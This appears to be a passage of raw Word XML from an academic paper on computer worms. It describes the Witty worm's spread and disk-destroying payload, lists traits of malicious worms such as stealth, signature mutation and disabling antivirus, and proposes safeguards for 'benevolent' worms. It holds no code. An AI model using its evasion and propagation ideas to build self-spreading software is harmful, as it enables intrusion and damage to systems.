          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploited a vulnerability in how the target monitored and parsed certain network packets.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  Once infected the worm would execute code to randomly pick IP</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> addresses to attempt to infect next.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00A67E3E"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worm was one of the first known to carry such a destructive payload at a large scale.  It also used an exploit only one day after the </w:t>
      </w:r>
      <w:r w:rsidR="005C49F8">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>vulnerability'</w:t>
      </w:r>
      <w:r w:rsidR="005C49F8" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> public release.  It used random sized packets for transmission of the exploit which made it harder to filter out or detect on the network.  It is believe it used a previous known hit list of vulnerable systems, perhaps from prior worms, to assist in finding targets to seed.  It managed to infect an estimated 12,000 machines.  “At the peak of the infection, Witty hosts </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ﬂooded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the Internet with more than 90 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Gbits</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> per second of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>trafﬁc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, sending more than 11 million packets per second” (Shannon</w:t>
      </w:r>
      <w:r w:rsidR="00544CFC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2004</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00F8063C" w:rsidP="00B63226">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It succeeded in attacking organizations that were diligent in network security and computer security.  It was targeted at firewalls and other security products and went to work just one day after a public exploit and patch was released.  Because of its automated nature it was able to spread faster than human intervention could handle.  Since the worm also damaged the hard disk it rendered many of the infected hosts useless as well as any useful data on the worm’s </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>code difficult to find.  Had the worm really wanted to hide its code from security analysis it could have written to the partition table and file system table of all hard disks instead and then rebooted the machine on its own.  The disadvantage is that the machine drops out of the worms propagation control.  However, a network administrator may take this just for a faulty disk and replace it and reinstall the OS with the exploit still unpatched which would allow the machine to once again be infected.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc321736790"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Summary of characteristics of malicious worms</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00F8063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Below is a summary of </w:t>
      </w:r>
      <w:r w:rsidR="005E215D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>characteristics or attributes of malicious worms based on those analyzed in this paper.  By understanding the behaviors and purposes of malicious worms we can identify those things which we would want to avoid in a benevolent worm.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00F8063C"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Autonomous replication typically via network probing</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Random IP selection</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C" w:rsidRPr="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>equential range scan of IP addresses</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UDP is a much faster propagation network transport (bandwidth limited)</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TCP is latency limited</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F8063C" w:rsidRDefault="00F8063C" w:rsidP="00F8063C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>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Stealth</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F8063C" w:rsidRPr="00F8063C" w:rsidRDefault="00B15A64" w:rsidP="00F8063C">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s</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C" w:rsidRPr="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>low-spr</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eading by controlling scan rate speed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3"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Triggers on specific date</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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Hides in configurations or disk on system</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F8063C" w:rsidRP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Mutate binary signature to avoid anti-virus</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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Encrypted communication</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F8063C" w:rsidRDefault="00F8063C" w:rsidP="00F8063C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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Avoids deep inspection firewalls, anti-virus, and IDS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3794" w:rsidRPr="00F8063C" w:rsidRDefault="000D3794" w:rsidP="000D3794">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tip off user</w:t>
      </w:r>
      <w:r w:rsidR="000C5666">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (everything looks normal)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or ask for consent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00F8063C"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lastRenderedPageBreak/>
        <w:t>Control mechanism</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</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Centralized</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and decentralized</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Master control servers give further instructions or payload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F8063C" w:rsidRDefault="00F8063C" w:rsidP="00F8063C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>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Resilience</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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P2P in decentralized models</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3"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Separation of duties to avoid entire worm/botnet being disabled</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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Encrypt or encode worm code to slow down security researchers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F8063C" w:rsidRPr="00F8063C"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Disable OS updates, anti-virus, and firewalls</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00F8063C"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Payloads</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Some do nothing at all (just spread the worm)</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Some cause damage</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (delete files, overheat hardware)</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DDoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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 xml:space="preserve">Some </w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">simply </w:t>
      </w:r>
      <w:r w:rsidRPr="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wait for further instructions</w:t>
      </w:r>
      <w:r w:rsidR="00F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or download second payload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00F8063C"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F8063C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Some steal data</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc321736791"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Summary of characteristics of</w:t>
      </w:r>
      <w:r w:rsidR="00747AAF">
        <w:t xml:space="preserve"> responsible</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:t xml:space="preserve"> benevolent worms</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00374D6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Based on the analysis of both malicious and benevolent worms as well as the summary of characteristics of malicious worms the following desired characteristics or attributes can be outlined for a responsible benevolent worm:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B828A6"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B828A6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Semi-autonomous replication over a network</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00B828A6" w:rsidRDefault="00CB26A3" w:rsidP="00B828A6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B828A6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Network administrator responsible for the network should have detailed control of the worm on their network</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00B828A6" w:rsidP="00B828A6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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00CB26A3" w:rsidRPr="00B828A6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Admin starting the spread of the worm</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001E5B27" w:rsidRPr="00B828A6" w:rsidRDefault="001E5B27" w:rsidP="00B828A6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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  Opt-out for their network IPs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00BD4912" w:rsidRDefault="00BD4912" w:rsidP="00BD4912">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Governor control on h</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00BD4912">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ow fast it should spread</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00BD4912"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BD4912">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Where it should spread itself (IP ranges)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00BD4912"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BD4912">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>When it should auto-terminate</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00BD4912"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BD4912">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">End-user on the system “infected” with benevolent worm should have a warning and cancel interface before their system is </w:t>
      </w:r>
      <w:r w:rsidR="00BD4912">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>patched or used to spread the worm</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="001E5B27" w:rsidRDefault="00CB26A3" w:rsidP="001E5B27">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E5B27">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>An automatic timer will assume Yes if specified by the network admin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="001E5B27" w:rsidP="001E5B27">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worm finds network that is vulnerable but has opted out it could notify the network administrator as well</w:t>
      </w:r>
      <w:r w:rsidR="00FF3FB7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and not execute on the network</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7" w:rsidRDefault="00FF3FB7" w:rsidP="001E5B27">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kill signal at network segment level to stop the worm</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00747AAF" w:rsidRPr="001E5B27" w:rsidRDefault="00747AAF" w:rsidP="001E5B27">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 if worm is unexpectedly crashing systems and send kill signal to stop all</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7" w:rsidRDefault="00FF3FB7" w:rsidP="00B63226">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>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Preserve resources</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00CB26A3" w:rsidP="00FF3FB7">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Worm must not cause network congestion especially on WAN or Internet lines connected to a LAN</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7" w:rsidRPr="00FF3FB7" w:rsidRDefault="00FF3FB7" w:rsidP="00FF3FB7">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Worm must not consume excessive CPU or other local resources</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00FF3FB7" w:rsidRDefault="00CB26A3" w:rsidP="00FF3FB7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>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Control mechanism</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00FF3FB7" w:rsidP="00FF3FB7">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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7" w:rsidRDefault="00FF3FB7" w:rsidP="00FF3FB7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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Reduces network bandwidth burden to central server</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7" w:rsidRPr="00FF3FB7" w:rsidRDefault="00FF3FB7" w:rsidP="00FF3FB7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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robust in terms of firewalls or other limited routes that wouldn't be able to access a centralized server</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00FF3FB7" w:rsidRDefault="00CB26A3" w:rsidP="00FF3FB7">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Should only accept signed commands from know trusted source or originator</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00FF3FB7" w:rsidRDefault="00FF3FB7" w:rsidP="00FF3FB7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>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Verifiable</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7"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All code for the worm should be digitally signed for verification</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7"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lastRenderedPageBreak/>
        <w:t>Each new version should be signed with a new certificate versus an old one</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00FF3FB7" w:rsidRDefault="00CB26A3" w:rsidP="00FF3FB7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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Allows to untrust older versions and only trust the latest new</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7"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Auditable</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7"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Execution of all instructions and actions performed on an infected machine where the worm is must be logged on that machine</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FF3FB7"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FF3FB7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Any processes, threads, or other executing code on the system that crashes while the worm is executing, whether caused by the worm or not, must be </w:t>
      </w:r>
      <w:r w:rsidR="00FF3FB7" w:rsidRPr="00FF3FB7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>logged</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRDefault="00FF3FB7" w:rsidP="00B63226">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Timestamps</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00FF3FB7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> should include the complete date and time in the UTC time</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00FF3FB7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>zone</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00747AAF" w:rsidRDefault="00FF3FB7" w:rsidP="00B63226">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>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 xml:space="preserve">Clocks need not be </w:t>
      </w:r>
      <w:r w:rsidR="00747AAF" w:rsidRPr="00747AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>synchronized (may not be possible)</w:t>
      </w:r>
      <w:r w:rsidRPr="00747AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> but the log should have a way to reference differences in times with other </w:t>
      </w:r>
      <w:r w:rsidR="00747AAF" w:rsidRPr="00747AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>systems running the same worm.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00747AAF"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 xml:space="preserve">When a worm propagates from one machine to another it should keep </w:t>
      </w:r>
      <w:r w:rsidR="00747AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidRPr="00747AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>short history of the path it has taken so it can be traced back to the originator</w:t>
      </w:r>
    </w:p>
